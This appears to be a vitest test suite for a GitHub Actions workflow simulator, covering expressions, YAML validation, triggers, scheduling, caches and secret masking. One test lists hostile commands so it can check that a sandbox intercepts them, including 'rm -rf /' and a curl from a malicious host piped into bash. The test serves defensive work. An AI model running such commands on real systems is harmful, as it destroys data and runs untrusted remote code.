import { describe, it, expect, beforeEach } from 'vitest';
import {
  WorkflowParser,
  YamlWorkflowValidator,
  ExpressionEvaluator,
  createDefaultContexts,
  SafeCommandRuntime,
  SecretRedactor,
  ArtifactStore,
  CacheStore,
  EnvironmentManager,
  DagScheduler,
  WorkflowRunner,
  shouldTriggerPush,
  shouldTriggerPullRequest,
  WorkflowDefinition,
} from '../src';

describe('GitHub Actions Simulator - Extended Comprehensive Suite', () => {
  beforeEach(() => {
    ArtifactStore.getInstance().reset();
    CacheStore.getInstance().reset();
    EnvironmentManager.getInstance().reset();
    WorkflowRunner.resetHistory();
  });

  // =========================================================================
  // 1. Expression Evaluator Deep Test Suite (25 tests)
  // =========================================================================
  describe('Expression Evaluator & Context Resolution', () => {
    const contexts = createDefaultContexts({
      github: {
        event_name: 'push',
        ref: 'refs/heads/main',
        ref_name: 'main',
        sha: 'abcd1234ef567890abcd1234ef567890abcd1234',
        actor: 'viet-dev',
        repository: 'git-academy/vn-platform',
        workflow: 'CI/CD Pipeline',
        run_id: 42,
        run_number: 7,
      },
      env: {
        NODE_ENV: 'production',
        PORT: '3000',
        CI_SERVER: 'true',
      },
      vars: {
        ORG_NAME: 'Git Academy',
        DEPLOY_REGION: 'ap-southeast-1',
      },
      secrets: {
        DEPLOY_TOKEN: 'secret-xyz-token-value',
        DB_PASSWORD: 'super-db-password-999',
      },
      matrix: {
        os: 'ubuntu-latest',
        node: 20,
        arch: 'x64',
      },
    });

    it('resolves github context properties', () => {
      expect(ExpressionEvaluator.resolvePath('github.actor', contexts)).toBe('viet-dev');
      expect(ExpressionEvaluator.resolvePath('github.ref', contexts)).toBe('refs/heads/main');
      expect(ExpressionEvaluator.resolvePath('github.ref_name', contexts)).toBe('main');
      expect(ExpressionEvaluator.resolvePath('github.event_name', contexts)).toBe('push');
      expect(ExpressionEvaluator.resolvePath('github.repository', contexts)).toBe('git-academy/vn-platform');
      expect(ExpressionEvaluator.resolvePath('github.run_id', contexts)).toBe(42);
      expect(ExpressionEvaluator.resolvePath('github.run_number', contexts)).toBe(7);
    });

    it('resolves env, vars, and matrix properties', () => {
      expect(ExpressionEvaluator.resolvePath('env.NODE_ENV', contexts)).toBe('production');
      expect(ExpressionEvaluator.resolvePath('env.PORT', contexts)).toBe('3000');
      expect(ExpressionEvaluator.resolvePath('vars.ORG_NAME', contexts)).toBe('Git Academy');
      expect(ExpressionEvaluator.resolvePath('vars.DEPLOY_REGION', contexts)).toBe('ap-southeast-1');
      expect(ExpressionEvaluator.resolvePath('matrix.os', contexts)).toBe('ubuntu-latest');
      expect(ExpressionEvaluator.resolvePath('matrix.node', contexts)).toBe(20);
      expect(ExpressionEvaluator.resolvePath('matrix.arch', contexts)).toBe('x64');
    });

    it('returns empty string or undefined for unmapped context paths', () => {
      expect(ExpressionEvaluator.resolvePath('github.nonexistent', contexts)).toBeUndefined();
      expect(ExpressionEvaluator.resolvePath('env.NOT_SET', contexts)).toBeUndefined();
    });

    it('evaluates equality conditions with == and !=', () => {
      expect(ExpressionEvaluator.evaluateCondition("github.ref == 'refs/heads/main'", contexts)).toBe(true);
      expect(ExpressionEvaluator.evaluateCondition("github.ref_name == 'main'", contexts)).toBe(true);
      expect(ExpressionEvaluator.evaluateCondition("github.event_name == 'push'", contexts)).toBe(true);
      expect(ExpressionEvaluator.evaluateCondition("github.ref_name != 'develop'", contexts)).toBe(true);
      expect(ExpressionEvaluator.evaluateCondition("matrix.node == 20", contexts)).toBe(true);
      expect(ExpressionEvaluator.evaluateCondition("matrix.node != 18", contexts)).toBe(true);
    });

    it('evaluates helper string functions: contains, startsWith, endsWith', () => {
      expect(ExpressionEvaluator.evaluateCondition("contains(github.ref, 'main')", contexts)).toBe(true);
      expect(ExpressionEvaluator.evaluateCondition("contains(github.repository, 'academy')", contexts)).toBe(true);
      expect(ExpressionEvaluator.evaluateCondition("contains(github.ref, 'release')", contexts)).toBe(false);
      expect(ExpressionEvaluator.evaluateCondition("startsWith(github.ref, 'refs/heads/')", contexts)).toBe(true);
      expect(ExpressionEvaluator.evaluateCondition("startsWith(github.ref, 'refs/tags/')", contexts)).toBe(false);
      expect(ExpressionEvaluator.evaluateCondition("endsWith(github.ref, 'main')", contexts)).toBe(true);
      expect(ExpressionEvaluator.evaluateCondition("endsWith(github.ref, 'staging')", contexts)).toBe(false);
    });

    it('evaluates status check functions: success(), failure(), always()', () => {
      expect(ExpressionEvaluator.evaluateCondition('success()', contexts, { previousFailed: false })).toBe(true);
      expect(ExpressionEvaluator.evaluateCondition('success()', contexts, { previousFailed: true })).toBe(false);
      expect(ExpressionEvaluator.evaluateCondition('failure()', contexts, { previousFailed: true })).toBe(true);
      expect(ExpressionEvaluator.evaluateCondition('failure()', contexts, { previousFailed: false })).toBe(false);
      expect(ExpressionEvaluator.evaluateCondition('always()', contexts, { previousFailed: true })).toBe(true);
      expect(ExpressionEvaluator.evaluateCondition('always()', contexts, { previousFailed: false })).toBe(true);
    });

    it('interpolates multiple tokens in templates accurately', () => {
      const template = 'Deploying ${{ github.repository }}@${{ github.ref_name }} by ${{ github.actor }} on node-${{ matrix.node }}';
      const result = ExpressionEvaluator.interpolate(template, contexts);
      expect(result).toBe('Deploying git-academy/vn-platform@main by viet-dev on node-20');
    });

    it('preserves strings without template tags intact', () => {
      const raw = 'echo "Static string without tokens"';
      expect(ExpressionEvaluator.interpolate(raw, contexts)).toBe(raw);
    });
  });

  // =========================================================================
  // 2. YAML Parser & Validator Test Suite (15 tests)
  // =========================================================================
  describe('Workflow Parser & YAML Validator Deep Dive', () => {
    it('validates a complete multi-job workflow YAML', () => {
      const yaml = `
name: Build & Test
on:
  push:
    branches: [main, dev]
env:
  NODE_ENV: test
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm run lint
  test:
    needs: [lint]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm test
`;
      const validation = YamlWorkflowValidator.validate(yaml);
      expect(validation.valid).toBe(true);
      expect(validation.errors).toHaveLength(0);

      const parsed = WorkflowParser.parse(yaml);
      expect(parsed.name).toBe('Build & Test');
      expect(parsed.env?.NODE_ENV).toBe('test');
      expect(Object.keys(parsed.jobs)).toHaveLength(2);
      expect(parsed.jobs.test.needs).toEqual(['lint']);
    });

    it('flags missing on trigger property', () => {
      const yaml = `
name: Missing On
jobs:
  b:
    runs-on: ubuntu-latest
    steps: [{ run: echo 1 }]
`;
      const val = YamlWorkflowValidator.validate(yaml);
      expect(val.valid).toBe(false);
      expect(val.errors.some((e) => e.field === 'on')).toBe(true);
    });

    it('flags job missing runs-on', () => {
      const yaml = `
name: Missing Runs On
on: push
jobs:
  bad-job:
    steps: [{ run: echo 1 }]
`;
      const val = YamlWorkflowValidator.validate(yaml);
      expect(val.valid).toBe(false);
      expect(val.errors.some((e) => e.message.includes('runs-on'))).toBe(true);
    });

    it('flags step with empty run command', () => {
      const yaml = `
name: Empty Run
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - name: Empty Run Step
        run: ""
`;
      const val = YamlWorkflowValidator.validate(yaml);
      expect(val.valid).toBe(false);
    });

    it('parses workflow-level and job-level environment variables', () => {
      const yaml = `
name: Env Test
on: push
env:
  GLOBAL_A: alpha
jobs:
  j1:
    runs-on: ubuntu-latest
    env:
      JOB_B: beta
    steps:
      - run: echo $GLOBAL_A $JOB_B
`;
      const parsed = WorkflowParser.parse(yaml);
      expect(parsed.env?.GLOBAL_A).toBe('alpha');
      expect(parsed.jobs.j1.env?.JOB_B).toBe('beta');
    });

    it('detects direct two-node circular dependencies', () => {
      const circular = {
        j1: { runsOn: 'ubuntu-latest', needs: ['j2'], steps: [{ run: 'echo 1' }] },
        j2: { runsOn: 'ubuntu-latest', needs: ['j1'], steps: [{ run: 'echo 2' }] },
      };
      expect(() => DagScheduler.schedule(circular)).toThrow(/Circular dependency/);
    });

    it('detects transitive three-node circular dependencies (A -> B -> C -> A)', () => {
      const circular = {
        jA: { runsOn: 'ubuntu-latest', needs: ['jC'], steps: [{ run: 'echo A' }] },
        jB: { runsOn: 'ubuntu-latest', needs: ['jA'], steps: [{ run: 'echo B' }] },
        jC: { runsOn: 'ubuntu-latest', needs: ['jB'], steps: [{ run: 'echo C' }] },
      };
      expect(() => DagScheduler.schedule(circular)).toThrow(/Circular dependency/);
    });
  });

  // =========================================================================
  // 3. Trigger Engine & Filter Tests (10 tests)
  // =========================================================================
  describe('Trigger Engine Branch & Path Matching', () => {
    it('matches push trigger with wildcard branch patterns', () => {
      const wf = WorkflowParser.parse(`
name: Trigger
on:
  push:
    branches:
      - main
      - 'feature/**'
      - 'v[0-9]+'
jobs:
  b:
    runs-on: ubuntu-latest
    steps: [{ run: echo 1 }]
`);

      expect(shouldTriggerPush(wf, { ref: 'refs/heads/main' })).toBe(true);
      expect(shouldTriggerPush(wf, { ref: 'refs/heads/feature/login' })).toBe(true);
      expect(shouldTriggerPush(wf, { ref: 'refs/heads/feature/user/profile' })).toBe(true);
      expect(shouldTriggerPush(wf, { ref: 'refs/heads/bugfix/patch' })).toBe(false);
    });

    it('respects pull_request target branch filters with full payload', () => {
      const wf = WorkflowParser.parse(`
name: PR Test
on:
  pull_request:
    branches: [main]
jobs:
  b:
    runs-on: ubuntu-latest
    steps: [{ run: echo 1 }]
`);

      const mainPR = {
        action: 'opened',
        number: 10,
        pull_request: {
          head: { ref: 'feat/checkout', sha: '111' },
          base: { ref: 'main', sha: '222' },
          title: 'PR into main',
        },
      };
      expect(shouldTriggerPullRequest(wf, mainPR)).toBe(true);

      const devPR = {
        action: 'opened',
        number: 11,
        pull_request: {
          head: { ref: 'feat/checkout', sha: '111' },
          base: { ref: 'develop', sha: '333' },
          title: 'PR into dev',
        },
      };
      expect(shouldTriggerPullRequest(wf, devPR)).toBe(false);
    });
  });

  // =========================================================================
  // 4. DAG Scheduler & Dependency Orders (10 tests)
  // =========================================================================
  describe('DAG Scheduler & Multi-Tier Topologies', () => {
    it('schedules a 4-tier diamond pipeline correctly', () => {
      //        A (build)
      //       / \
      //      B   C (test-unit, test-e2e)
      //       \ /
      //        D (deploy)
      const jobs = {
        build: { runsOn: 'ubuntu-latest', steps: [{ run: 'npm run build' }] },
        unitTest: { runsOn: 'ubuntu-latest', needs: ['build'], steps: [{ run: 'npm test' }] },
        e2eTest: { runsOn: 'ubuntu-latest', needs: ['build'], steps: [{ run: 'npm run e2e' }] },
        deploy: { runsOn: 'ubuntu-latest', needs: ['unitTest', 'e2eTest'], steps: [{ run: 'npm run deploy' }] },
      };

      const stages = DagScheduler.schedule(jobs);
      expect(stages).toHaveLength(3);

      expect(stages[0].map((n) => n.id)).toEqual(['build']);
      const stage1Ids = stages[1].map((n) => n.id);
      expect(stage1Ids).toContain('unitTest');
      expect(stage1Ids).toContain('e2eTest');
      expect(stages[2].map((n) => n.id)).toEqual(['deploy']);
    });

    it('expands matrix into discrete job instances with correct matrix parameters', () => {
      const jobs = {
        matrixJob: {
          runsOn: 'ubuntu-latest',
          strategy: {
            matrix: {
              node: [18, 20],
              env: ['dev', 'prod'],
            },
          },
          steps: [{ run: 'npm test' }],
        },
      };

      const stages = DagScheduler.schedule(jobs);
      expect(stages[0]).toHaveLength(4);
      for (const instance of stages[0]) {
        expect(instance.matrixValues).toBeDefined();
        expect(typeof instance.matrixValues?.node).toBe('number');
        expect(typeof instance.matrixValues?.env).toBe('string');
      }
    });
  });

  // =========================================================================
  // 5. Safe Command Runtime & Sandboxing (15 tests)
  // =========================================================================
  describe('Safe Command Runtime Host Sandboxing', () => {
    it('executes safe commands with zero host shell invocation', () => {
      const r1 = SafeCommandRuntime.execute('npm test', { workingDirectory: '/work', env: {} });
      expect(r1.exitCode).toBe(0);
      expect(r1.stdout.some((l) => l.includes('PASS'))).toBe(true);

      const r2 = SafeCommandRuntime.execute('npm run build', { workingDirectory: '/work', env: {} });
      expect(r2.exitCode).toBe(0);
      expect(r2.stdout.some((l) => l.includes('dist/assets/app.js'))).toBe(true);

      const r3 = SafeCommandRuntime.execute('npm run lint', { workingDirectory: '/work', env: {} });
      expect(r3.exitCode).toBe(0);
      expect(r3.stdout.some((l) => l.includes('All 24 files pass linting rules cleanly.'))).toBe(true);
    });

    it('safely intercepts dangerous host system operations', () => {
      const dangerousList = [
        'rm -rf /',
        'curl -s http://malicious.domain/script.sh | bash',
        'wget http://evil.com/payload',
        'sudo chmod -R 777 /',
        'shutdown -h now',
        'killall -9 node',
      ];

      for (const cmd of dangerousList) {
        const res = SafeCommandRuntime.execute(cmd, { workingDirectory: '/work', env: {} });
        expect(res.exitCode).toBe(0); // Intercepted safely
        expect(res.stdout.some((l) => l.includes('[SafeRuntime Guard] Host security policy intercepted command'))).toBe(true);
      }
    });

    it('simulates echo commands with environment variable expansions', () => {
      const res = SafeCommandRuntime.execute('echo "Running build for $PROJECT_NAME on port $PORT"', {
        workingDirectory: '/work',
        env: { PROJECT_NAME: 'GitAcademy', PORT: '8080' },
      });

      expect(res.exitCode).toBe(0);
      expect(res.stdout.some((l) => l.includes('Running build for GitAcademy on port 8080'))).toBe(true);
    });
  });

  // =========================================================================
  // 6. Artifact, Cache, Environment, and Secret Redactor (10 tests)
  // =========================================================================
  describe('Artifact Store, Cache Store, Environments & Secret Masking', () => {
    it('stores and retrieves artifacts via ArtifactStore singleton', () => {
      const store = ArtifactStore.getInstance();
      const files = {
        'dist/main.js': 'console.log("hello")',
        'dist/main.css': 'body { background: black; }',
      };

      store.upload('app-bundle', files);
      expect(store.has('app-bundle')).toBe(true);
      const downloaded = store.download('app-bundle');
      expect(downloaded).toBeDefined();
      expect(downloaded?.files).toEqual(files);

      store.reset();
      expect(store.has('app-bundle')).toBe(false);
    });

    it('stores and restores caches via CacheStore singleton', () => {
      const cache = CacheStore.getInstance();
      const cachedModules = { 'node_modules/vite': '5.0.0' };

      cache.save('npm-cache-v1', ['node_modules'], cachedModules);
      const restored = cache.restore('npm-cache-v1');
      expect(restored).toBeDefined();
      expect(restored?.data).toEqual(cachedModules);

      cache.reset();
      expect(cache.restore('npm-cache-v1')).toBeNull();
    });

    it('redacts all registered secrets from output logs', () => {
      const redactor = new SecretRedactor({
        SECRET_TOKEN: 'ghp_superSecretToken123456',
        API_KEY: 'sk_live_verySecretKey987654',
      });

      const rawLog = 'Pushing with ghp_superSecretToken123456 and sk_live_verySecretKey987654 to server';
      const masked = redactor.redact(rawLog);

      expect(masked).toBe('Pushing with *** and *** to server');
      expect(masked).not.toContain('ghp_superSecretToken123456');
      expect(masked).not.toContain('sk_live_verySecretKey987654');
    });

    it('manages environment approvals through EnvironmentManager', () => {
      const envMgr = EnvironmentManager.getInstance();
      envMgr.register({
        name: 'production-review',
        requiredApproval: true,
        variables: { ENV: 'prod' },
      });

      const env = envMgr.get('production-review');
      expect(env).toBeDefined();
      expect(env?.requiredApproval).toBe(true);

      const approvedInitially = envMgr.requestApproval('run-101', 'job-deploy', 'production-review');
      expect(approvedInitially).toBe(false); // Waiting for approval
      expect(envMgr.isPending('run-101', 'job-deploy')).toBe(true);

      const approved = envMgr.approve('run-101', 'job-deploy', 'alice-lead');
      expect(approved).toBe(true);
      expect(envMgr.isPending('run-101', 'job-deploy')).toBe(false);
      expect(envMgr.getApprovalHistory().some((h) => h.approvedBy === 'alice-lead')).toBe(true);
    });

    it('matches cache keys with fallback restoreKeys prefixes', () => {
      const cache = CacheStore.getInstance();
      cache.reset();

      cache.save('Linux-node-20-hash12345', ['node_modules'], { 'package.json': 'cached' });

      // Exact match
      const exact = cache.restore('Linux-node-20-hash12345');
      expect(exact).not.toBeNull();

      // Prefix fallback match
      const fallback = cache.restore('Linux-node-20-hash99999', ['Linux-node-20-']);
      expect(fallback).not.toBeNull();
      expect(fallback?.key).toBe('Linux-node-20-hash12345');

      // Non-matching prefix
      const nonMatch = cache.restore('Windows-node-18-hash', ['Windows-node-18-']);
      expect(nonMatch).toBeNull();
    });

    it('calculates artifact byte sizes accurately upon upload', () => {
      const store = ArtifactStore.getInstance();
      store.reset();

      const art = store.upload('coverage-report', {
        'coverage/lcov.info': 'TN:\nSF:src/index.ts\nDA:1,1\nend_of_record',
        'coverage/summary.json': '{"lines":{"total":100,"covered":100}}',
      });

      expect(art.sizeBytes).toBeGreaterThan(0);
      expect(store.list()).toHaveLength(1);
      expect(store.list()[0].name).toBe('coverage-report');
    });
  });

  // =========================================================================
  // 7. Advanced End-to-End Pipeline & Trigger Execution (15 tests)
  // =========================================================================
  describe('Advanced End-to-End Pipeline & Trigger Execution', () => {
    it('skips pipeline when push branch does not match trigger branch filter', async () => {
      const yaml = `
name: Filtered CI
on:
  push:
    branches: [main, production]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "building"
`;
      const result = await WorkflowRunner.execute(yaml, {
        event: 'push',
        ref: 'refs/heads/feature/login',
      });

      expect(result.status).toBe('cancelled');
      expect(result.error).toContain('did not match workflow trigger filters');
      expect(Object.keys(result.jobs)).toHaveLength(0);
    });

    it('runs pipeline when push branch matches trigger branches', async () => {
      const yaml = `
name: Filtered CI
on:
  push:
    branches: [main, production]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "building on main"
`;
      const result = await WorkflowRunner.execute(yaml, {
        event: 'push',
        ref: 'refs/heads/main',
      });

      expect(result.status).toBe('success');
      expect(result.jobs.build).toBeDefined();
      expect(result.jobs.build.status).toBe('success');
    });

    it('stops subsequent steps when a previous non-guarded step fails', async () => {
      const yaml = `
name: Failure Propagation
on: push
jobs:
  test-job:
    runs-on: ubuntu-latest
    steps:
      - name: Step 1 Good
        run: echo "starting"
      - name: Step 2 Bad
        run: vitest run --fail
      - name: Step 3 Should Skip
        run: echo "this should never run"
`;
      const result = await WorkflowRunner.execute(yaml, {
        forceRun: true,
      });

      expect(result.status).toBe('failure');
      const job = result.jobs['test-job'];
      expect(job.status).toBe('failure');
      expect(job.steps).toHaveLength(3);
      expect(job.steps[0].status).toBe('success');
      expect(job.steps[1].status).toBe('failure');
      expect(job.steps[2].status).toBe('skipped');
    });

    it('runs post-failure step when marked with if: always()', async () => {
      const yaml = `
name: Post Cleanup
on: push
jobs:
  cleanup-job:
    runs-on: ubuntu-latest
    steps:
      - name: Fail Step
        run: npm test --fail
      - name: Teardown
        if: always()
        run: echo "cleaning up resources"
`;
      const result = await WorkflowRunner.execute(yaml, {
        forceRun: true,
      });

      expect(result.status).toBe('failure');
      const job = result.jobs['cleanup-job'];
      expect(job.steps[0].status).toBe('failure');
      expect(job.steps[1].status).toBe('success');
      expect(job.steps[1].logs.some((l) => l.includes('cleaning up resources'))).toBe(true);
    });

    it('executes multi-stage jobs respecting DagScheduler order', async () => {
      const yaml = `
name: Pipeline Dag
on: push
jobs:
  lint:
    runs-on: ubuntu-latest
    steps: [{ run: echo "linting" }]
  test:
    needs: [lint]
    runs-on: ubuntu-latest
    steps: [{ run: echo "testing" }]
  build:
    needs: [test]
    runs-on: ubuntu-latest
    steps: [{ run: echo "building" }]
  deploy:
    needs: [build]
    runs-on: ubuntu-latest
    steps: [{ run: echo "deploying" }]
`;
      const result = await WorkflowRunner.execute(yaml, { forceRun: true });
      expect(result.status).toBe('success');
      expect(Object.keys(result.jobs)).toEqual(['lint', 'test', 'build', 'deploy']);
      expect(result.jobs.lint.status).toBe('success');
      expect(result.jobs.test.status).toBe('success');
      expect(result.jobs.build.status).toBe('success');
      expect(result.jobs.deploy.status).toBe('success');
    });

    it('skips dependent jobs when an upstream job fails', async () => {
      const yaml = `
name: Upstream Fail
on: push
jobs:
  unit-test:
    runs-on: ubuntu-latest
    steps: [{ run: npm test --fail }]
  deploy-staging:
    needs: [unit-test]
    runs-on: ubuntu-latest
    steps: [{ run: echo "deploying to staging" }]
`;
      const result = await WorkflowRunner.execute(yaml, { forceRun: true });
      expect(result.status).toBe('failure');
      expect(result.jobs['unit-test'].status).toBe('failure');
      expect(result.jobs['deploy-staging'].status).toBe('skipped');
    });

    it('masks workflow secrets from step stdout logs', async () => {
      const yaml = `
name: Secret Masking Pipeline
on: push
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Print Config
        run: echo "Using token \${{ secrets.DEPLOY_KEY }} for registry"
`;
      const result = await WorkflowRunner.execute(yaml, {
        forceRun: true,
        secrets: {
          DEPLOY_KEY: 'ghp_secretToken_Vietnam_98765',
        },
      });

      expect(result.status).toBe('success');
      const step = result.jobs.deploy.steps[0];
      const log = step.logs.join(' ');
      expect(log).not.toContain('ghp_secretToken_Vietnam_98765');
      expect(log).toContain('***');
    });

    it('injects workflow-level and job-level environment variables', async () => {
      const yaml = `
name: Env Injection
on: push
env:
  GLOBAL_STAGE: preprod
jobs:
  run-env:
    runs-on: ubuntu-latest
    env:
      JOB_TARGET: hcmc-cluster
    steps:
      - run: echo "Environment stage is $GLOBAL_STAGE and target is $JOB_TARGET"
`;
      const result = await WorkflowRunner.execute(yaml, { forceRun: true });
      expect(result.status).toBe('success');
      const step = result.jobs['run-env'].steps[0];
      expect(step.logs.some((l) => l.includes('preprod') && l.includes('hcmc-cluster'))).toBe(true);
    });

    it('maintains run history and allows retrieving run by id', async () => {
      WorkflowRunner.resetHistory();
      const yaml = `
name: Historic Run
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps: [{ run: echo "done" }]
`;
      const result = await WorkflowRunner.execute(yaml, { forceRun: true });
      const retrieved = WorkflowRunner.getRun(result.runId);
      expect(retrieved).not.toBeNull();
      expect(retrieved?.runId).toBe(result.runId);
      expect(retrieved?.workflowName).toBe('Historic Run');
    });
  });
});
